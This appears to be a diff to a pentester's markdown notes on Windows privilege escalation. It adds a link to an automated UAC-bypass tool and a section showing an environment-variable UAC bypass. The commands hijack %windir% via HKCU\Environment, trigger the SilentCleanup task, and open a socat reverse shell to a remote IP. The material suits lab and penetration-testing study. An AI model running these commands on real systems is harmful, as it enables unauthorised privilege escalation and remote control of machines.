@@ -400,6 +400,10 @@
 - [Bypassing UAC](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)
 - [Way around UAC](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)
 
+
+[**Automated bypass**](https://github.com/hfiref0x/UACME)
+
+
 ## GUI bypass
 - **msconfig** RUNS with IL high
     - shell from msconfing = high
@@ -468,6 +472,24 @@ reg delete "HKCU\Software\Classes\ms-settings\" /f
 ```
 
 ## Enviroment Variable
+- Task scheduler
+- Rewrite Variable %windir% ==> HKCU\Environment
+  - Add at the end = "&REM " = comment everything that exist after the variable name
+```
+# Payload to be executed instead of normal scheduled task
+cmd.exe /c C:\tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
+
+# Adding the new registry
+reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.11.26.251:4446 EXEC:cmd.exe,pipes &REM " /f
+
+schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+# Cleanup new entries
+reg delete "HKCU\Environment" /v "windir" /f
+```
+
+
+  - 
 
 
 # Bypass Applocker
